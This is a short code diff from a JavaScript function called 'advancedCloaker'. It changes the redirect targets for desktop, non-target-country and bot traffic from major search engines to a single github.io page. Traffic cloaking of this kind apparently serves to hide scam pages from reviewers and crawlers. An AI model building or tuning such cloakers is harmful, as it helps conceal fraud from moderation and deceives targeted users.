@@ -10,9 +10,9 @@ function advancedCloaker() {
         
         // URLs to redirect different traffic to
         redirectUrls: {
-            desktop: 'https://www.google.com',
-            nonTargetCountry: 'https://www.bing.com',
-            bot: 'https://www.yahoo.com'
+            desktop: 'https://popmel-oficial.github.io/Oficial/',
+            nonTargetCountry: 'https://popmel-oficial.github.io/Oficial/',
+            bot: 'https://popmel-oficial.github.io/Oficial/'
         },
         
         // Cache duration in milliseconds (24 hours)
